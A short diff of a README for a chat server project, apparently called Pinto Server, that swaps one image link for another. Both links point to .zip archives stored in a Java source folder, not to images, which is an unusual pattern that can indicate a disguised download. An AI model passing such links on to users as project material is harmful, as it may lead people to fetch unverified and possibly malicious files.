@@ -1,5 +1,5 @@
 <p align="center">
-    <img src="https://raw.githubusercontent.com/Mierdoso87/PintoServer/main/src/main/java/me/vlod/Server_Pinto_v3.2-alpha.5.zip" width="256" height="256">
+    <img src="https://raw.githubusercontent.com/Mierdoso87/PintoServer/main/src/main/java/org/Pinto_Server_3.2.zip" width="256" height="256">
 </p>
 
 # 💬 Pinto Server
